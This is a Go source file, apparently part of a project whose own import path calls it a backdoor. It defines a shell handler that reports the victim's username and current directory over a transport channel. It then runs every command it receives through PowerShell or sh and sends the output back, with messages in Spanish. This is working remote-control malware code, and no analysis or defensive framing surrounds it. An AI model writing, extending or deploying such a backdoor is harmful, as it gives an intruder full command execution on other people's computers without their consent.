package handler

import (
	"backdoor/transport"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func ShellHandler(t transport.Transport, args []string) {
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}

	cwd, _ := os.Getwd()
	header := fmt.Sprintf("[*] Usuario: %s\n[*] Directorio: %s\n", username, cwd)
	t.Write([]byte(header + "\r\n"))

	var shellPath string
	var shellArgs []string
	if runtime.GOOS == "windows" {
		shellPath = "powershell.exe"
		shellArgs = []string{"-NoLogo", "-Command"}
	} else {
		shellPath = "sh"
		shellArgs = []string{"-c"}
	}

	for {
		input, err := t.Read()
		if err != nil {
			break
		}

		cmdStr := strings.TrimSpace(string(input))
		if cmdStr == "exit" {
			break
		}

		cmd := exec.Command(shellPath, append(shellArgs, cmdStr)...)
		output, err := cmd.CombinedOutput()

		finalOutput := string(output)
		if err != nil {
			finalOutput += fmt.Sprintf("\n[!] Error al ejecutar el comando: %v", err)
		}

		// Normaliza saltos de línea
		finalOutput = strings.ReplaceAll(finalOutput, "\n", "\r\n")

		t.Write([]byte(finalOutput + "\r\n"))
	}
}
